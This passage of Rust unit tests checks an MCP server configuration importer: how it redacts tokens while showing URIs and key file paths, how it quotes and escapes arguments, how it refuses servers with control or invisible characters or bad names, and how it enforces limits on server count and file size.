        assert_eq!(open.refused, None, "a place is not a credential");
        // `uri`, `endpoint` and `directory` name places too, and a path under
        // a key's name is a place (the short review of the fixes, settled by
        // the coordinator).
        let places = by_name(&servers, "places");
        assert_eq!(
            places.shown(),
            "tls-mcp --token-uri https://t.example.com/a --token-endpoint https://t.example.com/b \
             --secrets-directory \"/run/s x\" --key ./client.key --ssh-key ~/.ssh/id_ed25519 \
             --key-store C:\\keys\\client.key --cert-key ../k"
        );
        assert!(!places.hidden());
        assert_eq!(places.refused, None);
        for server in &servers {
            assert!(!server.shown().contains(token), "{}", server.shown());
        }
    }

    /// Where each argument begins and ends shows: one that is empty, or
    /// holds a space or a `"`, is quoted, its `"` and `\` escaped.
    #[test]
    fn every_arguments_bounds_show() {
        let servers = servers_in(
            r#"{"mcpServers": {"x": {"command": "C:\\Program Files\\x.exe",
                "args": ["two words", "", "say \"hi\"", "C:\\tools\\y", "plain"]}}}"#,
            false,
        )
        .unwrap();
        assert_eq!(
            servers[0].shown(),
            r#""C:\\Program Files\\x.exe" "two words" "" "say \"hi\"" C:\tools\y plain"#
        );
    }

    /// A control character or one that acts unseen, in a name, the program,
    /// an argument or an address, refuses the server; so does a name that
    /// cannot be a setting's.
    #[test]
    fn a_control_or_unseen_character_or_a_name_that_cannot_be_set_refuses_a_server() {
        let long = "n".repeat(MAX_NAME + 1);
        let longest = "n".repeat(MAX_NAME);
        let text = format!(
            r#"{{"mcpServers": {{
                "bell": {{"command": "run\u0007"}},
                "line": {{"command": "run", "args": ["a\nb"]}},
                "tab\there": {{"command": "run"}},
                "space": {{"url": "https://x.example.com/\u200bmcp"}},
                "": {{"command": "run"}},
                "{long}": {{"command": "run"}},
                "{longest}": {{"command": "run"}}
            }}}}"#
        );
        let servers = servers_in(&text, false).unwrap();
        for name in ["bell", "line", "tab\there", "space"] {
            assert_eq!(
                by_name(&servers, name).refused,
                Some(Refusal::Unseen),
                "{name:?}"
            );
        }
        assert_eq!(by_name(&servers, "").refused, Some(Refusal::Name));
        assert_eq!(by_name(&servers, &long).refused, Some(Refusal::Name));
        assert_eq!(by_name(&servers, &longest).refused, None);
    }

    /// At most [`MAX_SERVERS`] of a file's servers are given, and a file
    /// past the size read is refused whole.
    #[test]
    fn the_size_caps_hold() {
        let many: Vec<String> = (0..=MAX_SERVERS)
            .map(|n| format!("\"s{n:03}\": {{\"command\": \"run\"}}"))
            .collect();
        let text = format!("{{\"mcpServers\": {{{}}}}}", many.join(","));
        assert_eq!(servers_in(&text, false).unwrap().len(), MAX_SERVERS);
        let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import_cap");
        let path = scratch.file("mcp.json", &text);
        let size = text.len() as u64;
        assert_eq!(
            read_servers_within(&path, size).unwrap().len(),
            MAX_SERVERS,
            "a file of the size read is read"
        );
        assert_eq!(
            read_servers_within(&path, size - 1),
            Err(ImportError::TooLarge)
        );
    }

    #[test]
    fn a_file_is_read_whole_or_not_at_all() {
        let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import");
        let path = scratch.file("mcp.json", CLAUDE);
        assert_eq!(read_servers(&path).unwrap().len(), 6);
        assert!(matches!(
            read_servers(&scratch.join("missing.json")),
            Err(ImportError::Unreadable(_))
        ));
    }
}
